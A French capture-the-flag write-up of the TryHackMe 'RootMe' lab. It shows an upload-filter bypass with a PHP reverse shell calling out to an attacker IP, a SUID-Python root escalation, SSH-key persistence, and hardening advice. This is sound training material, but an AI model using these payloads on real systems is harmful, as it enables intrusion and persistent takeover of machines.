# TryHackMe: RootMe

La room **RootMe** est une machine d’initiation sur [TryHackMe](https://tryhackme.com/room/rootme) destinée à illustrer l’exploitation d’un formulaire d’upload vulnérable, suivie d’une élévation de privilèges simple. L’objectif est de récupérer :

1. le flag utilisateur (`user.txt`) ;
2. le flag root (`root.txt`).

---

## Étape 1 : Reconnaissance

### Ciblage de la machine

```text
IP cible : 10.10.104.124
```

Seul le port 80 (HTTP) est accessible.

### Analyse Web

La page d’accueil propose un **téléversement de fichiers**. Toute tentative d’upload d’un fichier `.php` est refusée :

```
PHP não é permitido!
```

---

## Étape 2 : Accès initial via téléversement de fichier

### Vulnérabilité identifiée

L’extension `.php5` est toujours interprétée par Apache comme du PHP. L’upload d’un web‑shell `shell.php5` est donc autorisé :

```php
<?php
$sock = fsockopen('10.8.123.123', 4444);
exec('/bin/sh -i <&3 >&3 2>&3');
?>
```

Le fichier est ensuite accessible à l’URL :

```
http://10.10.104.124/uploads/shell.php5
```

### Exécution du shell

Côté attaquant :

```bash
rlwrap nc -lvnp 4444
```

Le chargement de l’URL déclenche un **reverse shell** sous `www‑data` et permet de lire `user.txt`.

---

## Étape 3 : Escalade de privilèges

### Recherche SUID

```bash
find / -perm -4000 -type f 2>/dev/null
```

Résultat pertinent :

```
/usr/bin/python
```

### Exploitation Python SUID

Le binaire Python possède le bit SUID. Il est donc possible de se faire passer root :

```bash
python -c 'import os,pty; os.setuid(0); os.system("/bin/bash")'
```

```bash
root@rootme:~# whoami
root
```

---

## Étape 4 : Persistance via SSH

1. Générer une paire de clés locale :

   ```bash
   ssh-keygen -t ed25519
   ```

2. Ajouter la clé publique dans `/root/.ssh/authorized_keys` sur la machine cible.

3. Vérifier l’accès :

   ```bash
   ssh -i id_ed25519 root@10.10.104.124
   ```

---

## Résultat final

```bash
root@rootme:~# cat /root/root.txt
THM{<redacted>}
```

---

## Recommandations de sécurité

1. **Filtrage strict des uploads** : liste blanche des extensions et analyse du contenu.
2. **Désactivation des extensions PHP secondaires** dans la configuration Apache.
3. **Réduction de surface SUID** : retirer le bit SUID des interpréteurs non essentiels.
4. **Journalisation et alertes** sur les téléversements et l’exécution de fichiers dans les répertoires web.

---

## Conclusion

Un simple contournement d’upload et une mauvaise gestion des SUID suffisent à compromettre totalement le système. Le durcissement de la configuration Apache et une politique de privilèges minimale sont indispensables.

---

**Auteur :** Saad Idrissi

